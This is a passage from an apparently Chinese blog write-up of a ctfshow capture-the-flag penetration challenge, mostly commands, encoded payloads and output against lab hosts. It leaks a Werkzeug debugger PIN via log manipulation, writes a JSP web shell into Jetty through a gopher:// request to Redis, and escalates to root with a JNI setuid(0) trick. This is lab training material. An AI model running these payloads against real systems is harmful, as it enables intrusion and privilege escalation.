class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造curl</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/set_log_option?logFile<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd%2526logName<span class="token operator">=</span><span class="token number">1</span><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/get_log_content?logFile<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>尝试利用<code>clear_log_file</code>直接读 &#x2F;etc&#x2F;passwd，但是前面要写日志到文件中，明显权限不足</p><p>想到还有 console，但是没有PIN码，怎么办呢</p><p>因为这里有 logging 库，可以把控制台打印的东西保存下来，而我们访问<code>/console?__debugger__=yes&amp;cmd=printpin&amp;s=SECRET</code>时会把PIN码打印在控制台，那么就可以把PIN码写到日志</p><p>那么先获取console的key，直接访问console，在返回的html中就有：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.186.6:8888/console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113120057969.png" alt="image-20250113120057969"></p><p>然后设置日志文件路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.186.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl -b  "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3CODA.xtpnmtcEw-pXdixnj36DDm51-FY" "http://172.2.186.6:8888/set_log_option%3flogName=werkzeug%2526logFile=main.log"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来使控制台打印出PIN码写到日志中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span>  <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> http://172.2.186.6:8888/console?__debugger__<span class="token operator">=</span>yes<span class="token operator">&amp;</span><span class="token assign-left variable">cmd</span><span class="token operator">=</span>printpin<span class="token operator">&amp;</span><span class="token assign-left variable">s</span><span class="token operator">=</span>64cjjJmRmKNv647oy994<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可以对命令进行编码来避免解码问题</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//172.2.186.5/1.php?1=system(base64_decode('Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aM2ZSb2cuakRhSXlvQzlzcGF6QUprZ2N3UUlhcGtHSXhVIiAiaHR0cDovLzE3Mi4yLjE4Ni42Ojg4ODgvY29uc29sZT9fX2RlYnVnZ2VyX189eWVzJmNtZD1wcmludHBpbiZzPTY0Y2pqSm1SbUtOdjY0N295OTk0Ig=='));</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后读取日志</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.186.6:8888/get_log_content?logFile<span class="token operator">=</span>main.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113120555016.png" alt="image-20250113120555016"></p><p>得到PIN码 606-570-039</p><p>然后进行PIN验证：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=606-570-039&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.186.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtYiAic2Vzc2lvbj1leUoxYzJWeUlqb2lZV1J0YVc0aWZRLlozZlJvZy5qRGFJeW9DOXNwYXpBSmtnY3dRSWFwa0dJeFUiICJodHRwOi8vMTcyLjIuMTg2LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTYwNi01NzAtMDM5JnM9NjRjampKbVJtS052NjQ3b3k5OTQi'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113121001352.png" alt="image-20250113121001352"></p><p>验证通过，需要用<code>curl -c</code>来保存cookie</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-c</span> cookie.txt <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=606-570-039&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问跳板机上的cookie.txt</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113121452111.png" alt="image-20250113121452111"></p><p>然后带着这个cookie去就可以rce了，这里直接文件读取了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span>  <span class="token string">"__wzdb4206e39743d62f78f25=1736741655|a7b6c7c8a2a5"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=open('/etc/passwd','r').read()&amp;frm=0&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113122334237.png" alt="image-20250113122334237"></p><p>flag：<code>ctfshow&#123;ctfer:x:1000:1000::/home/ctfer:/bin/bash&#125;</code></p><hr><h1 id="第五章（Jetty）"><a href="#第五章（Jetty）" class="headerlink" title="第五章（Jetty）"></a>第五章（Jetty）</h1><h2 id="艰难的最后一步"><a href="#艰难的最后一步" class="headerlink" title="艰难的最后一步"></a>艰难的最后一步</h2><p>那这章就是 jetty 服务了：172.2.xxx.7:8080</p><p>参考：<a href="https://xz.aliyun.com/t/11821">https://xz.aliyun.com/t/11821</a></p><p>测试读到 web.xml</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104011242035.png" alt="image-20250104011242035"></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">web-app</span> <span class="token name">PUBLIC</span><span class="token string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span><span class="token string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>Archetype Created Web Application<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- 环境参数 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.host<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>localhost<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.port<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.Integer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>6380<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>ctfshow_2025<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.timeout<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.Integer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>10000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>app_root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>/opt/jetty/webapps/ROOT/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;ctfshow_2025&#125;</code></p><hr><h2 id="功亏一篑（复现）"><a href="#功亏一篑（复现）" class="headerlink" title="功亏一篑（复现）"></a>功亏一篑（复现）</h2><p>一开始是想在php跳板机上写一个 php 打 gopher 到 redis 上</p><p>但是发现 curl 是支持 <code>dict://</code> 协议和<code>gopher://</code>协议的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token string">"dict://172.2.132.7:6380/auth:ctfshow_2025"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtdiAiZGljdDovLzE3Mi4yLjEzMi43OjYzODAvYXV0aDpjdGZzaG93XzIwMjUi'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113123016886.png" alt="image-20250113123016886"></p><p>直接构造 gopher 请求包写jsp马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auth ctfshow_2025<span class="token builtin class-name">set</span> mars <span class="token string">"&lt;% Runtime.getRuntime().exec(new String[]&#123;<span class="token entity" title="\&quot;">\"</span>sh<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>-c<span class="token entity" title="\&quot;">\"</span>,request.getParameter(<span class="token entity" title="\&quot;">\"</span>cmd<span class="token entity" title="\&quot;">\"</span>)&#125;);%>"</span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /opt/jetty/webapps/ROOT/config <span class="token builtin class-name">set</span> dbfilename <span class="token number">2</span>.jspsavequit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>url编码然后发送</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token string">"gopher://172.2.132.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtdiAiZ29waGVyOi8vMTcyLjIuMTMyLjc6NjM4MC9fYXV0aCUyMGN0ZnNob3dfMjAyNSUwQXNldCUyMG1hcnMlMjAlMjIlM0MlMjUlMjBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyUyMFN0cmluZyU1QiU1RCU3QiU1QyUyMnNoJTVDJTIyJTJDJTVDJTIyLWMlNUMlMjIlMkNyZXF1ZXN0LmdldFBhcmFtZXRlciglNUMlMjJjbWQlNUMlMjIpJTdEKSUzQiUyNSUzRSUyMiUwQWNvbmZpZyUyMHNldCUyMGRpciUyMCUyRm9wdCUyRmpldHR5JTJGd2ViYXBwcyUyRlJPT1QlMkYlMEFjb25maWclMjBzZXQlMjBkYmZpbGVuYW1lJTIwMi5qc3AlMEFzYXZlJTBBcXVpdCI='</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113125116304.png" alt="image-20250113125116304"></p><p>执行成功，直接rce</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.7:8080/2.jsp?cmd<span class="token operator">=</span>ls%20/<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113180516096.png" alt="image-20250113180516096"></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113180555193.png" alt="image-20250113180555193"></p><p>同样的方式读取dylan.txt</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">The enemy cyber attacker 81192 has been injected with prions by our agents, and there is no chance of survival, victory is ours! The key is 7b11a7ae330883cb5bf667a9c1604635.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;7b11a7ae330883cb5bf667a9c1604635&#125;</code></p><hr><h2 id="今日方知我是我（复现）"><a href="#今日方知我是我（复现）" class="headerlink" title="今日方知我是我（复现）"></a>今日方知我是我（复现）</h2><p>需要提权为root</p><p>查suid</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">find%20/%20-perm%20-u<span class="token operator">=</span>s%20-type%20f%20<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/chsh/usr/bin/chfn/usr/bin/passwd/bin/mount/bin/umount/bin/su/bin/ping<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>GTFObins 搜了下没有可用的命令</p><p>查cap权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap%20-r%20/%20<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token operator">></span>/opt/jetty/webapps/ROOT/success.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/local/openjdk-8/bin/java <span class="token operator">=</span> cap_setuid+ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>java 设置了 cap_setuid 权限</p><p>那么需要用 java 执行<code>setuid(0)</code>的操作，然而java并不像python那样有专门的 os.setuid 可以设置</p><p>需要通过 JNI + setuid 实现，参考 <a href="https://stackoverflow.com/questions/5985597/jni-setuid-question">https://stackoverflow.com/questions/5985597/jni-setuid-question</a></p><p>这里按照官方wp的做法：</p><p>利用编码写入 SetUID.c:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;jni.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>JNIEXPORT jint JNICALL <span class="token function">Java_SetUID_setUID</span><span class="token punctuation">(</span>JNIEnv <span class="token operator">*</span>env<span class="token punctuation">,</span> jobject obj<span class="token punctuation">,</span> jint uid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">setuid</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>echo%20<span class="token string">"I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9"</span>%20<span class="token operator">|</span>base64%20-d%2<span class="token operator"><span class="token file-descriptor important">0</span>></span>/opt/jetty/webapps/ROOT/SetUID.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入 SetUID.java：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SetUID</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"SetUID"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token keyword">int</span> <span class="token function">setUID</span><span class="token punctuation">(</span><span class="token keyword">int</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SetUID</span> setUID <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SetUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> result <span class="token operator">=</span> setUID<span class="token punctuation">.</span><span class="token function">setUID</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Runtime</span><span class="token punctuation">.</span>getRuntime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat /root/*.txt>/opt/jetty/webapps/ROOT/root.txt"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>echo%20<span class="token string">"cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ=="</span>%20<span class="token operator">|</span>base64%20-d%2<span class="token operator"><span class="token file-descriptor important">0</span>></span>/opt/jetty/webapps/ROOT/SetUID.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译 c 和 java 文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I<span class="token variable">$&#123;JAVA_HOME&#125;</span>/include%20-I<span class="token variable">$&#123;JAVA_HOME&#125;</span>/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c<span class="token number">2</span>.jsp?cmd<span class="token operator">=</span>javac%20/opt/jetty/webapps/ROOT/SetUID.java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以root权限执行命令：</p><pre class="line-numbers language-bash" data-language="bash"><code 